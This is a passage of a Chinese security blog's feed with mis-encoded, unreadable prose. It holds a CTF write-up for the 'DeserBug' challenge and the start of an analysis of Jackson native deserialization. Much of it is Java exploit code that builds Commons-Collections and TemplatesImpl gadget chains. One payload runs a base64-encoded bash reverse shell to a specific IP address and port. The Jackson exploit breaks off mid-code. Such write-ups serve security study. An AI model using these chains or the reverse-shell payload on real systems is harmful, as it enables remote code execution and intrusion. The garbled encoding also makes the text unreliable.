href="#å¼€å§‹å‡ºé”™" class="headerlink" title="å¼€å§‹å‡ºé”™"></a>å¼€å§‹å‡ºé”™</h2><p>ç¬¬ä¸€æ¬¡è‡ªå·±å†™æˆ‘æ˜¯æƒ³ç›´æ¥å°†æ¶æ„ç±»æ”¾åˆ°Myexpectä¸Šæ¥è§¦å‘çš„ï¼Œä½†æ˜¯ä»–å¹¶ä¸è¡Œï¼Œåæ¥å‘ç°æ˜¯æˆ‘javassistå†™é”™äº†</p><p>ç¬¬ä¸€æ¬¡exp(ä½†æ˜¯è¿œç¨‹ä¸é€šï¼Œå…¶å®æœ¬åœ°ä¹Ÿé€šä¸äº†ğŸ˜…)</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ciscn2023;<br><br><span class="hljs-keyword">import</span> cn.hutool.json.JSONObject;<br><span class="hljs-keyword">import</span> com.app.Myexpect;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URLEncoder;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exp</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//ç”Ÿæˆæ¶æ„ç±»</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> clazz.toClass();<br><br><br>        <span class="hljs-type">Myexpect</span> <span class="hljs-variable">myexpect</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myexpect</span>();<br>        setValue(myexpect,<span class="hljs-string">&quot;targetclass&quot;</span>,aClass); <span class="hljs-comment">//è®¾ç½®targetClassä¸ºæ¶æ„ç±»</span><br>        myexpect.setTypearg(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br>        myexpect.setTypeparam(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;);<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>        jsonObject.put(<span class="hljs-string">&quot;clown&quot;</span>,myexpect);<br><br>        <span class="hljs-comment">//cc5éƒ¨åˆ†</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(jsonObject, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-string">&quot;aaa&quot;</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">//åå°„ä¿®æ”¹valå±æ€§</span><br>        Class b= BadAttributeValueExpException.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> b.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(badAttributeValueExpException,tiedMapEntry);<br><br>        <span class="hljs-comment">//ç”Ÿæˆbase64åºåˆ—åŒ–æ•°æ®</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(badAttributeValueExpException);<br>        <span class="hljs-type">byte</span>[] byteArray = barr.toByteArray();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">encode</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArray);<br><span class="hljs-comment">//        System.out.println(encode);</span><br>        System.out.println(URLEncoder.encode(encode));<span class="hljs-comment">//ä¸€å®šè¦è®°å¾—urlç¼–ç ä¸ç„¶æ‰“ä¸é€š</span><br><br><span class="hljs-comment">//        ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArray);</span><br><span class="hljs-comment">//        ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);</span><br><span class="hljs-comment">//        objectInputStream.readObject();</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç°åœ¨å°±é‡ä¸Šä¸€ä¸ªéå¸¸å¥‡æ€ªçš„é—®é¢˜äº†ï¼Œä»–ç°åœ¨åœ¨åºåˆ—åŒ–çš„æ—¶å€™ä¼šå¼¹è®¡ç®—å™¨ï¼Œååºåˆ—åŒ–çš„æ—¶å€™ä¸ä¼šï¼Œä½†æ˜¯å½“æˆ‘åœ¨æœ¬åœ°æŠŠåºåˆ—åŒ–å‡ºæ¥çš„å­—ç¬¦ä¸²æ‹¿å‡ºæ¥ååºåˆ—åŒ–çš„æ—¶å€™ä»–åˆèƒ½å¼¹äº†å†å½“æˆ‘å»æ‰“è¿œç¨‹çš„æ—¶å€™ä»–æ‰“ä¸é€šï¼Œåªå›æ˜¾ä¸€ä¸ª</p><p><img src="https://cdn.clown2024.cn/202410151636267.png" alt="image-20241015163624227"></p><p>åæ¥åˆå‘ç°ä¸Šé¢çš„çš„lazyMapä¹Ÿå†™é”™äº†ï¼Œåº”è¯¥æ˜¯è¿™æ ·</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Map lazyMap = LazyMap.decorate(jsonObject, new ConstantTransformer(myexpect));<br></code></pre></td></tr></table></figure><p>å› ä¸ºè¿™æ ·æ‰èƒ½ä¿è¯æˆ‘ä»¬putè¿›å»çš„valueæ˜¯Myexpectç±»ï¼Œå› ä¸º<strong>ConstantTransformer</strong>è¿™ä¸ªç±»çš„transformè¿”å›çš„å°±æ˜¯æœ¬èº«ï¼ˆå¤ªä¹…æ²¡çœ‹ccé“¾æœ‰ç‚¹å¿˜äº†</p><p>ä½†è¿˜æ˜¯é€šä¸äº†ï¼Œä¼šç»™æˆ‘æŠ¥é”™ClassNotFoundçš„é”™è¯¯</p><p>æˆ‘ååˆ†åœ°ä¸ç†è§£ï¼Œç†è®ºä¸ŠMyexpectèƒ½åœ¨ååºåˆ—åŒ–æ‰§è¡ŒnewInstanceï¼Œé‚£æˆ‘ç›´æ¥æ‰§è¡Œæ¶æ„ç±»çš„newInstanceä¸å°±å¥½äº†ï¼Œå¹¶ä¸éœ€è¦å»å†æ‰“cc3åé¢ä¸€æ•´ä¸ªéƒ¨åˆ†ï¼Œä½†æ˜¯ä»–å°±æ˜¯ä¸è¡Œï¼Œæˆ‘ä¹Ÿæ²¡æ‰¾å‡ºæ¥é—®é¢˜åœ¨å“ª</p><h2 id="æ‰¾åˆ°åŸå› "><a href="#æ‰¾åˆ°åŸå› " class="headerlink" title="æ‰¾åˆ°åŸå› "></a>æ‰¾åˆ°åŸå› </h2><p>å“¦caoè°ƒäº†åŠå¤©ï¼Œæˆ‘å»çœ‹äº†ä¸€ä¸‹è°ƒç”¨æ ˆç»ˆäºå‘ç°é—®é¢˜äº†</p><p><img src="https://cdn.clown2024.cn/202410151636181.png" alt="image-20241015163634114"></p><p><img src="https://cdn.clown2024.cn/202410151636869.png" alt="image-20241015163641816"></p><p><img src="https://cdn.clown2024.cn/202410151636685.png" alt="image-20241015163650638"></p><p>è¿˜æ˜¯åŸºç¡€ä¸ç‰¢çš„åŸå› å•ŠğŸ˜­</p><p>ä¸‹é¢æ ¹æ®ä¸Šé¢çš„å›¾è¯´ä¸€ä¸‹æˆ‘è‡ªå·±çš„ç†è§£ï¼Œå¯¹javaç±»åŠ è½½åˆæ¸…æ™°äº†ä¸€äº›</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">é¦–å…ˆæ‰§è¡ŒnewInstanceçš„è¯éœ€è¦èµ°æ•´ä¸ªç±»åŠ è½½çš„æµç¨‹<br>ç„¶åä¼šå…ˆå»æ‰¾å…¨ç±»å<br>å› ä¸ºæ²¡æœ‰è¿™ä¸ªç±»æ‰€ä»¥åœ¨ClassForNameé€”ä¸­å°±ä¼šæŠ¥é”™<br>è€ŒdefineClassç›´æ¥ä»å­—èŠ‚ç å‘jvmæ³¨å†Œè¿™ä¸ªç±»ç›´æ¥è·³è¿‡äº†å‰é¢çš„æ­¥éª¤<br>æ‰€ä»¥è¦æ‰§è¡ŒTemplatesImplçš„defineClassæ‰è¡Œ<br></code></pre></td></tr></table></figure><p>ä¸‹é¢å†™ä¸€ä¸‹èƒ½é€šçš„expå§ï¼Œå°±æ˜¯å°è£…TrAXFilteræ¥æ‰“TemplatesImpl</p><p>expå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.ciscn2023;<br><br><span class="hljs-keyword">import</span> cn.hutool.json.JSONObject;<br><span class="hljs-keyword">import</span> com.app.Myexpect;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.net.URLEncoder;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">exp2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//ç”Ÿæˆæ¶æ„ç±»</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC80My4xMzkuMTA3LjIxMy84ODg4IDA+JjE=&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br><br>        <span class="hljs-type">Myexpect</span> <span class="hljs-variable">myexpect</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Myexpect</span>();<br>        myexpect.setTargetclass(TrAXFilter.class);<br>        myexpect.setTypeparam(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; Templates.class &#125;);<br>        myexpect.setTypearg(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; templates &#125;);<br>        <span class="hljs-type">JSONObject</span> <span class="hljs-variable">jsonObject</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONObject</span>();<br>        jsonObject.put(<span class="hljs-string">&quot;clown&quot;</span>,myexpect);<br><br>        <span class="hljs-comment">//cc5éƒ¨åˆ†</span><br>        <span class="hljs-type">Map</span> <span class="hljs-variable">lazyMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(jsonObject, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(myexpect));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap,<span class="hljs-string">&quot;aaa&quot;</span>);<br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-comment">//åå°„ä¿®æ”¹valå±æ€§</span><br>        Class b= BadAttributeValueExpException.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> b.getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        val.setAccessible(<span class="hljs-literal">true</span>);<br>        val.set(badAttributeValueExpException,tiedMapEntry);<br><br>        <span class="hljs-comment">//ç”Ÿæˆbase64åºåˆ—åŒ–æ•°æ®</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(badAttributeValueExpException);<br>        <span class="hljs-type">byte</span>[] byteArray = barr.toByteArray();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">encode</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(byteArray);<br><span class="hljs-comment">//        System.out.println(encode);</span><br>        System.out.println(URLEncoder.encode(encode));<span class="hljs-comment">//ä¸€å®šè¦è®°å¾—urlç¼–ç ä¸ç„¶æ‰“ä¸é€š</span><br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410151637073.png" alt="image-20241015163705024"></p><p><img src="https://cdn.clown2024.cn/202410151637818.png" alt="image-20241015163713767"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;è™½è¯´é¢˜ç›®ä¸æ˜¯å¾ˆéš¾ï¼Œä½†æ˜¯ç”±äºjavaé¢˜ç›®åšçš„è¿˜ä¸æ˜¯å¾ˆå¤šä¸å¤ªç†Ÿæ‚‰ï¼Œè€Œä¸”javaåŸºç¡€ä¸ç‰¢ï¼Œå¯¼è‡´ä¸€äº›ç‚¹è®©æˆ‘æ€è€ƒäº†å¾ˆä¹…ï¼Œè¿™é‡Œè®°å½•ä¸€ä¸‹&lt;/p&gt;
&lt;h1 id=&quot;deserbugé¢˜ç›®&quot;&gt;&lt;a href=&quot;#DeserBugé¢˜ç›®&quot; class=&quot;headerlink&quot; title=&quot;Des</summary>
      
    
    
    
    <category term="é¢˜ç›®å¤ç°" scheme="https://clowsman.github.io/categories/%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="ctf" scheme="https://clowsman.github.io/tags/ctf/"/>
    
    <category term="wp" scheme="https://clowsman.github.io/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>JacksonåŸç”Ÿååºåˆ—åŒ–</title>
    <link href="https://clowsman.github.io/2024/10/12/Jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://clowsman.github.io/2024/10/12/Jackson%E5%8E%9F%E7%94%9F%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-10-12T13:58:39.000Z</published>
    <updated>2024-11-02T16:20:31.642Z</updated>
    
    <content type="html"><![CDATA[<p>å‚è€ƒæ–‡ç« ï¼š<a href="https://xz.aliyun.com/t/12509?u_atoken=0f8fa2b10f046b73ed286030e1ee9f9e&u_asig=1a0c381017287414696367848e00f7">https://xz.aliyun.com/t/12509?u_atoken=0f8fa2b10f046b73ed286030e1ee9f9e&amp;u_asig=1a0c381017287414696367848e00f7</a></p><h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>Jacksonçš„åŸç”Ÿååºåˆ—åŒ–ä¸»è¦æ˜¯ä¸ºäº†è§¦å‘ä»»æ„getteræ–¹æ³•è°ƒç”¨é“¾å­ï¼Œç±»ä¼¼fastjsonåŸç”Ÿååºåˆ—åŒ–è§¦å‘getteré‚£æ ·</p><h1 id="getterè§¦å‘æµç¨‹"><a href="#getterè§¦å‘æµç¨‹" class="headerlink" title="getterè§¦å‘æµç¨‹"></a>getterè§¦å‘æµç¨‹</h1><p>æ—¢ç„¶è¦è°ƒç”¨ä»»æ„getteræ–¹æ³•ï¼Œé‚£æˆ‘ä»¬å°±è¦è§¦å‘getteræ–¹æ³•çš„æµç¨‹</p><p>Jacksonè§¦å‘getteræ˜¯åœ¨<strong>ObjectMapper#writeValueAsString</strong>æ–¹æ³•æ‰§è¡Œçš„æ—¶å€™</p><p>æ‰“ä¸ªæ–­ç‚¹è·Ÿè¸ªä¸€ä¸‹</p><p><img src="https://cdn.clown2024.cn/202410130102864.png" alt="image-20241013010248819"></p><p>è¿™é‡Œè¯´å‡ ä¸ªå…³é”®æ–¹æ³•</p><p>å…ˆèµ°åˆ°DefaultSerializerProvider#serializeValueæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410130106024.png" alt="image-20241013010627975"></p><p>è¿™é‡Œè·å–ä¸€ä¸ªåºåˆ—åŒ–å™¨ï¼Œæˆ‘ä»¬ä¼ å…¥äº†POJOå¯¹è±¡ï¼Œæ‰€ä»¥è¿”å›ä¸€ä¸ªBeanSerializer</p><p>ç„¶åå»åˆ°BeanSerializer#serializeæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410130110595.png" alt="image-20241013011008553"></p><p>writeStartObjectå’ŒwriteEndObjectå°±æ˜¯åˆ†åˆ«åœ¨é¦–å°¾å†™ä¸Šâ€™{â€˜å’Œâ€™}â€™</p><p>è°ƒç”¨getteræ–¹æ³•å°±åœ¨serializeFieldsæ–¹æ³•é‡Œé¢</p><p><img src="https://cdn.clown2024.cn/202410130112193.png" alt="image-20241013011227152"></p><p>åœ¨serializeAsFieldæ–¹æ³•é‡Œé¢è¿™ä¸ªåœ°æ–¹è°ƒç”¨äº†getteræ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410130117833.png" alt="image-20241013011745786"></p><h2 id="pojonode"><a href="#POJONode" class="headerlink" title="POJONode"></a>POJONode</h2><p>å‰é¢è¯´çš„éƒ½æ˜¯åºåˆ—åŒ–çš„getterï¼Œå’Œååºåˆ—åŒ–æœ‰ä»€ä¹ˆå…³ç³»å‘¢ï¼Œåœ¨Jacksonçš„åŸç”Ÿååºåˆ—åŒ–ä¸­ï¼Œåˆ©ç”¨çš„æ˜¯POJONodeçš„toStringæ–¹æ³•æ¥è§¦å‘å¯¹åº”ç±»å¯¹è±¡çš„getteræ–¹æ³•ï¼Œæˆ‘ä»¬å…ˆæ¥åˆ†æä¸€ä¸‹</p><blockquote><p>è¿™é‡Œæµ‹å¾—æ—¶å€™å‘ç°ç¦»è°±çš„åœ°æ–¹ï¼Œæµ‹è¯•å‡ºæ¥Jacksonåº”è¯¥æ˜¯åœ¨2.10.xæ‰æŠŠtoStringå»æ‰æ”¹åˆ°çˆ¶ç±»å»çš„ï¼Œåœ¨2.9.xä»¥åŠä¹‹å‰ï¼ŒPOJONodeè‡ªå·±æœ¬èº«æ˜¯æœ‰toStringæ–¹æ³•çš„ï¼Œè€Œä»–çš„çˆ¶ç±»BaseJsonNodeåè€Œæ˜¯æ²¡æœ‰å®ç°toStringçš„ï¼Œè¿™æ ·å°±ä¸èƒ½è¿›è¡Œåˆ©ç”¨äº†</p><p><img src="https://cdn.clown2024.cn/202410131258198.png" alt="image-20241013125810157"></p></blockquote><p>ä»–POJONodeæœ¬èº«æ˜¯æ²¡æœ‰toStringçš„ï¼Œæ˜¯åˆ°çˆ¶ç±»BaseJsonNodeæ‰æœ‰å®ç°ï¼Œç»§æ‰¿å…³ç³»å¦‚ä¸‹</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">POJONode --&gt; ValueNode --&gt; BaseJsonNode<br></code></pre></td></tr></table></figure><p>BaseJsonNode#toString</p><p><img src="https://cdn.clown2024.cn/202410130142098.png" alt="image-20241013014250059"></p><p>è¿™é‡Œè°ƒç”¨äº†ä¸€ä¸ªInternalNodeMapper.nodeToStringæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/202410130143214.png" alt="image-20241013014346177"></p><p>æ¬¸æ˜¯ä¸æ˜¯çœ‹åˆ°äº†ä¸€ä¸ªç†Ÿæ‚‰çš„ä¸œè¥¿ï¼ŒwriteValueAsStringï¼Œè¿™é‡Œä¹Ÿå°±æ˜¯è§¦å‘getteræ–¹æ³•çš„åœ°æ–¹ï¼Œä¹Ÿå°±æ˜¯æ¼æ´è§¦å‘ç‚¹</p><p>æ‰€ä»¥è°ƒç”¨é“¾å°±æ˜¯è¿™æ ·çš„</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">BaseJsonNode#toString -&gt; InternalNodeMapper#nodeToString -&gt; ObjectWriter.writeValueAsString<br></code></pre></td></tr></table></figure><p>èƒ½è°ƒç”¨getteræ–¹æ³•å°±å¯ä»¥æ‰“é“¾å­äº†ï¼Œæ¯”å¦‚æ‰“TemplatesImpl</p><h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>è§¦å‘toStringè‡ªç„¶å°±é€‰æ‹©æˆ‘ä»¬å¸¸ç”¨çš„BadAttributeValueExpExceptionäº†</p><p>é“¾å­ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">BadAttributeValueExpException#readObject -&gt; POJONode#toString -&gt; BaseJsonNode#toString -&gt; InternalNodeMapper#nodeToString -&gt; ObjectWriter.writeValueAsString<br></code></pre></td></tr></table></figure><p>exp</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.attack;<br><br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">attack_usual</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>        <span class="hljs-comment">//ç”Ÿæˆæ¶æ„ç±»</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title 